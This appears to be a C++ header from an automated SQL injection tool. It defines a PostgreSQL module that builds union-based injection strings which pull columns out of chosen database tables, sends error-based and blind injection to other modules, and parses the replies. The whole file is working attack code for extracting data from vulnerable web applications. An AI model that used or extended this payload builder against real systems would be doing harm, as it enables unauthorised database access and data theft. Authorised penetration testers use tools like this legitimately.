#ifndef SQLI_POSTGRESQL
#define SQLI_POSTGRESQL

#define UNION 1
#define ERROR 2
#define BLIND 3

#define UNION_BASED_OFFSET 0
#define UNION_BASED_DATABASE 1
#define UNION_BASED_TABLE 2
#define UNION_BASED_COLUMN 3

#include "../mysql/mysql.hpp"
#include "blind_based.hpp"
#include "error_based.hpp"

struct sqli_postgresql
{
        inline static const str_vector excluded = {
            "information_schema",
            "pg_catalog",
            "pg_toast",
        };

        static std::string payload(
            sptr_vector& config,
            uint8 method_type,
            uint8 value_type)
        {
                switch (method_type)
                {
                case UNION:
                        if (value_type == VALUES)
                                return "' UNION SELECT " +
                                       *config[UNION_BASED_OFFSET] +
                                       *config[UNION_BASED_COLUMN] + "::text " +
                                       "FROM " + *config[UNION_BASED_DATABASE] + "." +
                                       *config[UNION_BASED_TABLE] + "-- ";
                        return mysql_union_based::payload(config, value_type);
                case ERROR:
                        return postgresql_error_based::payload(config, value_type);
                case BLIND:
                        return postgresql_blind_based::payload(config, value_type);
                default:
                        return std::string();
                }
        };

        static str_vector parser(
            const std::string& response,
            sptr_vector& config,
            const uint8& method_type,
            const uint8& value_type)
        {
                return sqli_mysql::parser(
                    response,
                    config,
                    method_type,
                    value_type);
        }
};
#endif
